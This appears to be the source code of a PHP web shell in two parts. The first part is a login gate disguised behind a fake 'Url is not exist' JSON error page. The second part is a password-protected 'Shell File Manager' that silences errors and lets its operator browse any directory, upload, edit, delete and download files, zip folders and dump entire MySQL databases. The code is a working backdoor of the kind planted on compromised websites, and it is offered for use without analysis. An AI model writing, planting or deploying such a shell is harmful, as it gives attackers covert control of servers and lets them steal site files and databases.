<?php
session_start();

$stored_hash = '21da499f2a12aae18ed591ea31fe97c9'; // md5 of your password

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Step 1: Show JSON on first load
if (!isset($_SESSION['json_shown']) && !isset($_SESSION['access_granted'])) {
    $_SESSION['json_shown'] = true;

    header('Content-Type: text/html');
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>URL Error</title>
        <style>
            body {
                background-color: #000;
                color: #fff;
            }
            .json-error {
                font-size: 16px;
            }
        </style>
    </head>
    <body>
        <div class="json-error">
            {"code":11,"msg":"Url is not exist","msgCode":5,"ServiceNowTime":"<?php echo date('Y-m-d H:i:s'); ?>"}
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Step 2: Handle password input after refresh
if (!isset($_SESSION['access_granted'])) {
    $error = null;

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (md5($_POST['password']) === $stored_hash) {
            $_SESSION['access_granted'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Incorrect password!";
        }
    }
    ?>

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login</title>
        <style>
            body {
                margin: 0;
                background-color: #000;
                color: #0f0;
                font-family: monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            input[type="password"] {
                background: transparent;
                border: none;
                border-bottom: 1px solid #0f0;
                color: #0f0;
                font-size: 18px;
                outline: none;
                text-align: center;
            }
            .error {
                color: red;
                margin-bottom: 10px;
            }
        </style>
    </head>
    <body>
        <div class="login-container" id="container">
            <?php if ($error): ?>
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            <form id="loginForm" method="post">
                <input type="password" name="password" id="password" autocomplete="off" placeholder="Enter password">
            </form>
        </div>

        <script>
            document.getElementById("password").focus();

            document.getElementById("password").addEventListener("keypress", function(e) {
                if (e.key === "Enter") {
                    e.preventDefault();
                    document.getElementById("loginForm").submit();
                }
            });
        </script>
    </body>
    </html>

    <?php
    exit;
}

// Step 3: If logged in
echo "<pre style='color: lime; background: black; padding: 20px;'>Access granted. Add your protected content here.</pre>";
?>
<?php
session_start();

$stored_hash = '21da499f2a12aae18ed591ea31fe97c9'; 

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['access_granted'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (md5($_POST['password']) === $stored_hash) {
            $_SESSION['access_granted'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Incorrect password!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Enter Password</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body { background: #f4f4f4; font-family: 'Segoe UI', sans-serif; }
            .login-container {
                max-width: 400px;
                margin: 100px auto;
                padding: 30px;
                background: white;
                border-radius: 8px;
                box-shadow: 0 0 15px rgba(0,0,0,0.2);
            }
        </style>
    </head>
    <body>
    <div class="login-container">
        <h3 class="mb-3 text-center">🔒 Enter Password</h3>
        <?php if (!empty($error)): ?>
            <div class="alert alert-danger"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>
        <form method="post">
            <input type="password" name="password" class="form-control mb-3" placeholder="Password" autofocus required>
            <button type="submit" class="btn btn-primary w-100">Submit</button>
        </form>
    </div>
    </body>
    </html>
    <?php
    exit;
}

@set_time_limit(0);
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '512M');
date_default_timezone_set('Asia/Kolkata');

$cwd = realpath($_GET['dir'] ?? getcwd());
$cwd = is_dir($cwd) ? $cwd : getcwd();
$action = $_POST['action'] ?? $_GET['action'] ?? '';
$msg = '';

// Rename
if ($action == 'rename' && isset($_POST['old']) && isset($_POST['new'])) {
    $old = $cwd . DIRECTORY_SEPARATOR . $_POST['old'];
    $new = $cwd . DIRECTORY_SEPARATOR . $_POST['new'];
    if (file_exists($old)) {
        rename($old, $new);
        $msg = "Renamed successfully.";
    }
}

// Delete
if ($action == 'delete' && isset($_GET['file'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . $_GET['file'];
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
    $msg = "Deleted successfully.";
}

// Upload
if ($action == 'upload' && isset($_FILES['file'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
    $msg = "Uploaded successfully.";
}

// SQL Dump (PHP Based)
if ($action == 'sqldump' && isset($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db'])) {
    $host = $_POST['host'];
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $db   = $_POST['db'];

    $conn = new mysqli($host, $user, $pass, $db);
    if ($conn->connect_error) {
        $msg = "Connection failed: " . $conn->connect_error;
    } else {
        $dump = "-- SQL Dump for $db\n";
        $dump .= "-- Generated on " . date('Y-m-d H:i:s') . "\n\n";
        $dump .= "SET FOREIGN_KEY_CHECKS=0;\n\n";

        $tables = $conn->query("SHOW TABLES");
        while ($row = $tables->fetch_row()) {
            $table = $row[0];
            $create = $conn->query("SHOW CREATE TABLE `$table`")->fetch_row()[1];
            $dump .= "DROP TABLE IF EXISTS `$table`;\n";
            $dump .= $create . ";\n\n";

            $rows = $conn->query("SELECT * FROM `$table`");
            while ($r = $rows->fetch_assoc()) {
                $cols = array_map(function($v) use ($conn) {
                    return "'" . $conn->real_escape_string($v) . "'";
                }, array_values($r));
                $dump .= "INSERT INTO `$table` VALUES (" . implode(",", $cols) . ");\n";
            }

            $dump .= "\n";
        }

        $dump .= "SET FOREIGN_KEY_CHECKS=1;\n";
        $dumpFile = $cwd . DIRECTORY_SEPARATOR . $db . '_' . date('Ymd_His') . '.sql';
        file_put_contents($dumpFile, $dump);
        $msg = "SQL Dump created: " . basename($dumpFile);
        $conn->close();
    }
}

// Preview
if ($action == 'preview' && isset($_GET['file'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . $_GET['file'];
    if (is_file($target)) {
        header('Content-Type: text/plain');
        readfile($target);
        exit;
    }
}

// Download
if ($action == 'download' && isset($_GET['file'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . $_GET['file'];
    if (is_file($target)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($target) . '"');
        readfile($target);
        exit;
    }
}

// Zip
if ($action == 'zipselected' && !empty($_POST['selected'])) {
    $selected = $_POST['selected'];
    $zipFile = $cwd . DIRECTORY_SEPARATOR . 'selected_backup_' . date('Ymd_His') . '.zip';

    $zip = new ZipArchive();
    if ($zip->open($zipFile, ZipArchive::CREATE) === TRUE) {
        foreach ($selected as $item) {
            $itemPath = realpath($cwd . DIRECTORY_SEPARATOR . $item);
            if ($itemPath !== false && strpos($itemPath, $cwd) === 0) {
                if (is_file($itemPath)) {
                    $zip->addFile($itemPath, $item);
                } elseif (is_dir($itemPath)) {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($itemPath),
                        RecursiveIteratorIterator::LEAVES_ONLY
                    );
                    foreach ($files as $file) {
                        if (!$file->isDir()) {
                            $filePath = $file->getRealPath();
                            $relativePath = $item . substr($filePath, strlen($itemPath));
                            $zip->addFile($filePath, $relativePath);
                        }
                    }
                }
            }
        }
        $zip->close();
        $msg = "Backup created: " . basename($zipFile);
    } else {
        $msg = "Failed to create zip.";
    }
}

// Save Edit
if ($action == 'saveedit' && isset($_POST['filename'], $_POST['content'])) {
    $editFile = $cwd . DIRECTORY_SEPARATOR . $_POST['filename'];
    file_put_contents($editFile, $_POST['content']);
    $msg = "File saved successfully.";
}

// Edit Form
if ($action == 'edit' && isset($_GET['file'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . $_GET['file'];
    if (is_file($target)) {
        $content = htmlspecialchars(file_get_contents($target));
        ?>
        <!DOCTYPE html>
        <html>
        <head>
          <title>Edit File - <?= basename($target) ?></title>
          <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
        </head>
        <body>
        <div class="container mt-4">
          <h4>Edit File: <?= htmlspecialchars(basename($target)) ?></h4>
          <form method="post">
            <input type="hidden" name="action" value="saveedit">
            <input type="hidden" name="filename" value="<?= htmlspecialchars($_GET['file']) ?>">
            <textarea name="content" rows="20" class="form-control mb-3"><?= $content ?></textarea>
            <button type="submit" class="btn btn-success">💾 Save</button>
            <a href="?dir=<?= urlencode($cwd) ?>" class="btn btn-secondary">⬅ Back</a>
          </form>
        </div>
        </body>
        </html>
        <?php
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Shell File Manager</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background: #f4f4f4; font-family: 'Segoe UI', sans-serif; }
    .container { margin-top: 30px; }
    .btn-sm { font-size: 0.8rem; padding: 0.3rem 0.5rem; }
  </style>
</head>
<body>
<div class="container">
  <h3>💻 Shell File Manager</h3>
  <a href="?logout=1" class="btn btn-danger mb-3">Logout</a>

  <?php if ($msg): ?>
    <div class="alert alert-success"><?= htmlspecialchars($msg) ?></div>
  <?php endif; ?>

  <div class="mb-2">
    <strong>Current Directory:</strong> <?= htmlspecialchars($cwd) ?><br>
    <a class="btn btn-sm btn-dark mt-2" href="?dir=<?= urlencode(dirname($cwd)) ?>">⬅️ Go Back</a>
  </div>

  <form method="post" enctype="multipart/form-data" class="mb-3">
    <input type="hidden" name="action" value="upload">
    <div class="input-group">
      <input type="file" name="file" class="form-control" required>
      <button type="submit" class="btn btn-primary">Upload</button>
    </div>
  </form>

  <form method="post" class="mb-4">
    <input type="hidden" name="action" value="sqldump">
    <div class="row g-2">
      <div class="col"><input type="text" name="host" placeholder="DB Host" class="form-control" required></div>
      <div class="col"><input type="text" name="user" placeholder="DB User" class="form-control" required></div>
      <div class="col"><input type="text" name="pass" placeholder="DB Password" class="form-control"></div>
      <div class="col"><input type="text" name="db" placeholder="Database" class="form-control" required></div>
      <div class="col"><button type="submit" class="btn btn-warning">Dump SQL</button></div>
    </div>
  </form>

  <form method="post" onsubmit="return confirm('Create zip of selected items?');">
    <input type="hidden" name="action" value="zipselected">
    <table class="table table-bordered table-striped">
      <thead class="table-dark">
        <tr>
          <th><input type="checkbox" id="selectAll"></th>
          <th>Name</th>
          <th>Size</th>
          <th>Modified</th>
          <th>Actions</th>
        </tr>
      </thead>
      <tbody>
        <?php foreach (scandir($cwd) as $item):
          if ($item === '.') continue;
          $path = $cwd . DIRECTORY_SEPARATOR . $item;
          $url_item = urlencode($item);
        ?>
        <tr>
          <td>
            <input type="checkbox" name="selected[]" value="<?= htmlspecialchars($item) ?>">
          </td>
          <td>
            <?php if (is_dir($path)): ?>
              <a href="?dir=<?= urlencode($cwd . DIRECTORY_SEPARATOR . $item) ?>" style="text-decoration:none; color:inherit;">
                📁 <?= htmlspecialchars($item) ?>
              </a>
            <?php else: ?>
              📄 <?= htmlspecialchars($item) ?>
            <?php endif; ?>
          </td>
          <td><?= is_file($path) ? filesize($path) . " bytes" : '-' ?></td>
          <td><?= date("Y-m-d H:i:s", filemtime($path)) ?></td>
          <td>
            <a href="?dir=<?= urlencode($cwd . DIRECTORY_SEPARATOR . $item) ?>" class="btn btn-sm btn-info">Open</a>
            <?php if (is_file($path)): ?>
              <a href="?dir=<?= urlencode($cwd) ?>&file=<?= $url_item ?>&action=preview" class="btn btn-sm btn-secondary">Preview</a>
              <a href="?dir=<?= urlencode($cwd) ?>&file=<?= $url_item ?>&action=download" class="btn btn-sm btn-success">Download</a>
              <a href="?dir=<?= urlencode($cwd) ?>&file=<?= $url_item ?>&action=edit" class="btn btn-sm btn-warning">Edit</a>
            <?php endif; ?>
            <a href="?dir=<?= urlencode($cwd) ?>&file=<?= $url_item ?>&action=delete" class="btn btn-sm btn-danger" onclick="return confirm('Delete?')">Delete</a>
            <form method="post" action="?dir=<?= urlencode($cwd) ?>" class="d-inline">
              <input type="hidden" name="action" value="rename">
              <input type="hidden" name="old" value="<?= htmlspecialchars($item) ?>">
              <input type="text" name="new" placeholder="Rename to" required>
              <button type="submit" class="btn btn-sm btn-dark">Rename</button>
            </form>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
    <button type="submit" class="btn btn-primary mb-4">📦 Create Zip of Selected</button>
  </form>
</div>

<script>
  document.getElementById('selectAll').addEventListener('change', function() {
    const checkboxes = document.querySelectorAll('input[name="selected[]"]');
    for (const cb of checkboxes) {
      cb.checked = this.checked;
    }
  });
</script>
</body>
</html>
